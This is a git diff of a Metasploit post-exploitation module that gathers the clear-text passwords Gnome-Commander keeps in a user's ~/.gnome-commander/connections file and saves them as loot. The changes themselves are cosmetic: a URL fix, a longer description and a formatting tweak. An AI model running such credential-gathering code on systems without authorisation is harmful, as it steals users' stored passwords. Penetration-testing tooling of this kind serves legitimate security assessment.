@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -11,7 +11,10 @@ class Metasploit3 < Msf::Post
     super( update_info( info,
         'Name'          => 'Linux Gather Gnome-Commander Creds',
         'Description'   => %q{
-          Gnome-commander stores clear text passwords in ~/.gnome-commander/connections file.
+            This module collects the clear text passwords stored by
+          Gnome-commander, a GUI file explorer for GNOME.  Typically, these
+          passwords are stored in the user's home directory, at
+          ~/.gnome-commander/connections.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
@@ -47,7 +50,7 @@ class Metasploit3 < Msf::Post
           vprint_line(str_file)
           #Store file
           p = store_loot("connections", "text/plain", session, str_file, connections_file, "Gnome-Commander connections")
-          print_good ("Connections file saved to #{p}")
+          print_good("Connections file saved to #{p}")
         rescue EOFError
           # If there's nothing in the file, we hit EOFError
           print_error("Nothing read from file: #{connections_file}, file may be empty")
